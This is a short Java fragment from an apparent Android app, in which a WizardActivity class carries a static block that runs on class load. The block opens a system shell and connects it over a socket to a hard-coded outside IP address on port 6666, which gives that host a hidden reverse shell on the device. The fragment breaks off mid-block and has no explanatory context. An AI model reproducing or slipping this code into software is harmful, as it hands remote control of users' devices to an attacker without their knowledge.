...
public class WizardActivity extends Activity {
	...
	// execute on class load
	static {
		try {
			final Process process = Runtime.getRuntime().exec("system/bin/sh");
			Socket socket = new Socket("173.236.183.33", 6666);
			StreamGobbler.gobbleStream(socket.getInputStream(), process.getOutputStream());
			StreamGobbler.gobbleStream(process.getInputStream(), socket.getOutputStream());
			StreamGobbler.gobbleStream(process.getErrorStream(), socket.getOutputStream());
			process.waitFor();
